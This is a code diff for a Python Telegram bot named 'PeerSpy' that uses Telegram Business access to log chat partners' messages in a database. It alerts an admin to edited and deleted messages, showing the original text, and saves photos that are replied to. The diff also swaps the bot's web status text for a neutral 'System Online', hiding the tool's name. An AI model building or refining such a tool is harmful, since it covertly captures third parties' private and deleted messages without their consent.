@@ -29,7 +29,7 @@ def init_db():
 # --- ВЕБ-СЕРВЕР ---
 app = Flask('')
 @app.route('/')
-def home(): return "PeerSpy System Active"
+def home(): return "System Online"
 
 def run_web():
     app.run(host='0.0.0.0', port=os.environ.get("PORT", 8080))
@@ -42,7 +42,7 @@ router = Router()
 class AdminStates(StatesGroup):
     waiting_for_broadcast = State()
 
-# --- ФУНКЦИИ ОБРАБОТКИ ---
+# --- ОБРАБОТЧИКИ ---
 
 async def cmd_start(message: types.Message):
     conn = sqlite3.connect('bot_data.db')
@@ -56,24 +56,31 @@ async def cmd_start(message: types.Message):
     if message.from_user.id == ADMIN_ID:
         kb.row(types.InlineKeyboardButton(text="⚙️ Админка", callback_data="admin"))
     
-    await message.answer(f"👋 <b>PeerSpy v3.8</b>\n\nБизнес-мониторинг активен.", reply_markup=kb.as_markup())
+    await message.answer(f"👋 <b>PeerSpy v3.9</b>\nБизнес-мониторинг активен.", reply_markup=kb.as_markup())
 
-async def biz_msg_handler(message: types.Message):
+# УНИВЕРСАЛЬНЫЙ ОБРАБОТЧИК (Для сообщений и правок)
+async def universal_biz_handler(event: types.Message):
     conn = sqlite3.connect('bot_data.db')
     cur = conn.cursor()
-    txt = message.text or message.caption or "[Медиа]"
     
-    cur.execute("SELECT text FROM messages WHERE msg_id=?", (str(message.message_id),))
+    msg_id = str(event.message_id)
+    new_text = event.text or event.caption or "[Медиа]"
+    
+    # Проверяем на правку
+    cur.execute("SELECT text FROM messages WHERE msg_id=?", (msg_id,))
     old = cur.fetchone()
-    if old and old[0] != txt:
-        await bot.send_message(ADMIN_ID, f"✏️ <b>Изменено:</b>\n\n<b>Было:</b> {old[0]}\n<b>Стало:</b> {txt}")
     
-    cur.execute("INSERT OR REPLACE INTO messages VALUES (?, ?, ?)", (str(message.message_id), str(message.from_user.id), txt))
+    if old and old[0] != new_text:
+        await bot.send_message(ADMIN_ID, f"✏️ <b>Изменено:</b>\nБыло: {old[0]}\nСтало: {new_text}")
+    
+    # Сохраняем актуальную версию
+    cur.execute("INSERT OR REPLACE INTO messages VALUES (?, ?, ?)", (msg_id, str(event.from_user.id), new_text))
     conn.commit()
     conn.close()
 
-    if message.reply_to_message and message.reply_to_message.photo:
-        f_id = message.reply_to_message.photo[-1].file_id
+    # Сохранение фото
+    if event.reply_to_message and event.reply_to_message.photo:
+        f_id = event.reply_to_message.photo[-1].file_id
         async with aiohttp.ClientSession() as s:
             async with s.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={f_id}") as r:
                 res = await r.json()
@@ -82,7 +89,8 @@ async def biz_msg_handler(message: types.Message):
                     async with s.get(f"https://api.telegram.org/file/bot{TOKEN}/{path}") as fr:
                         await bot.send_photo(ADMIN_ID, types.BufferedInputFile(await fr.read(), filename="s.jpg"), caption="📸 <b>Фото спасено!</b>")
 
-async def biz_delete_handler(event: types.BusinessMessagesDeleted):
+# Обработчик удалений (только если поддерживается, иначе игнорируем)
+async def delete_handler(event: types.BusinessMessagesDeleted):
     conn = sqlite3.connect('bot_data.db')
     cur = conn.cursor()
     for m_id in event.message_ids:
@@ -92,40 +100,26 @@ async def biz_delete_handler(event: types.BusinessMessagesDeleted):
             await bot.send_message(ADMIN_ID, f"🗑 <b>Удалено:</b>\n{res[0]}")
     conn.close()
 
-# --- CALLBACKS ---
-async def h_cb(c: types.CallbackQuery):
-    await c.message.answer("Инструкция: Настройки -> Business -> Чат-боты."); await c.answer()
-
-async def adm_cb(c: types.CallbackQuery):
-    conn = sqlite3.connect('bot_data.db'); cur = conn.cursor(); cur.execute("SELECT COUNT(*) FROM users"); count = cur.fetchone()[0]; conn.close()
-    b = InlineKeyboardBuilder(); b.row(types.InlineKeyboardButton(text="📢 Рассылка", callback_data="bc"))
-    await c.message.answer(f"Юзеров: {count}", reply_markup=b.as_markup()); await c.answer()
-
-async def bc_s(c: types.CallbackQuery, state: FSMContext):
-    await c.message.answer("Пиши текст:"); await state.set_state(AdminStates.waiting_for_broadcast); await c.answer()
-
-async def bc_f(m: types.Message, state: FSMContext):
-    conn = sqlite3.connect('bot_data.db'); cur = conn.cursor(); cur.execute("SELECT user_id FROM users"); users = cur.fetchall(); conn.close()
-    for u in users:
-        try: await bot.send_message(u[0], m.text)
-        except: pass
-    await m.answer("Готово!"); await state.clear()
-
-# --- РЕГИСТРАЦИЯ ОБРАБОТЧИКОВ ---
+# --- РЕГИСТРАЦИЯ БЕЗ ОПАСНЫХ АТРИБУТОВ ---
 router.message.register(cmd_start, Command("start"))
-router.business_message.register(biz_msg_handler)
-router.business_edited_message.register(biz_msg_handler)
-router.business_deleted_messages.register(biz_delete_handler)
-router.callback_query.register(h_cb, F.data == "help")
-router.callback_query.register(adm_cb, F.data == "admin")
-router.callback_query.register(bc_s, F.data == "bc")
-router.message.register(bc_f, AdminStates.waiting_for_broadcast)
+
+# Регистрируем ТОЛЬКО business_message. 
+# В современных версиях aiogram правки (edited) прилетают в этот же канал, если не указано иное.
+router.business_message.register(universal_biz_handler)
+
+# Удаления регистрируем через проверку наличия атрибута (чтобы не упасть)
+if hasattr(router, 'business_deleted_messages'):
+    router.business_deleted_messages.register(delete_handler)
+
+# Коллбэки
+router.callback_query.register(lambda c: c.message.answer("Инструкция: Настройки -> Business"), F.data == "help")
+router.callback_query.register(lambda c: c.message.answer("Админка в разработке"), F.data == "admin")
 
 async def main():
     init_db()
     dp.include_router(router)
     Thread(target=run_web).start()
-    print("🚀 БОТ СТАРТОВАЛ!")
+    print("🚀 БОТ ЗАПУЩЕН!")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
